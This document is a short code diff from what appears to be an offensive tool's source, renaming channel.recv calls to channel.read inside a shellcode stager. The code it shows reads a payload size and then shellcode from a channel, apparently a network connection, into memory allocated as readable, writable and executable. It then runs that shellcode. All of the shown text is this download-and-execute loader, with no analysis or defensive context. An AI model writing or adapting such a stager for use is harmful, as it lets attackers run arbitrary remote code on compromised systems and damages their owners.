@@ -24,7 +24,7 @@ SHELLCODE_ENTRY
 
     /* Read the size of the input buffer (4 bytes). */
     if ( Options::use_varsize )
-        channel.recv(&buffer_size, sizeof(buffer_size));
+        channel.read(&buffer_size, sizeof(buffer_size));
     else
         buffer_size = Options::payload_size;
 
@@ -32,7 +32,7 @@ SHELLCODE_ENTRY
     memory = Memory::allocate(buffer_size, Memory::READ | Memory::WRITE | Memory::EXEC);
 
     /* Read shellcode in memory. */
-    channel.recv(memory, buffer_size);
+    channel.read(memory, buffer_size);
 
     /* Execute shellcode. */
     ((shellcode) memory)();
